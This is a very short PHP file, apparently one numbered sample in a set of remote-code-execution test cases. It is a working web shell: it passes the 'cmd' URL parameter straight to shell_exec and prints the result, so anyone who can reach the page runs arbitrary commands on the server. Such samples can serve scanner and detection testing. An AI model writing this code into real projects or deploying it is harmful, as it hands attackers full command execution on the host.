<?php
// RCE test variation #1064
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>